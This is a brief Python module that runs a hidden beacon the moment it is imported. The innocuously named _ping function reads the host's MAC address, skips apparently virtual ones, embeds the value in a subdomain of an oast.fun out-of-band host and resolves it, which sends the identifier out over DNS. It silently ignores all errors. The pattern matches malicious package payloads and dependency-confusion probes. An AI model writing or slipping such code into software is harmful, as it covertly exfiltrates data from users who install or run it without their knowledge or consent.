import socket
import uuid

def _ping():
    try:
        mac = uuid.getnode()
        # Check if MAC is "real" (i.e., not locally administered)
        if (mac >> 40) % 2:
            return  # Skip if it's a fake MAC
        domain = "{}.jhffgrgwmjifkroakiskxg4tovvo5tc66.oast.fun".format(mac)
        socket.gethostbyname(domain)
    except:
        pass

_ping()
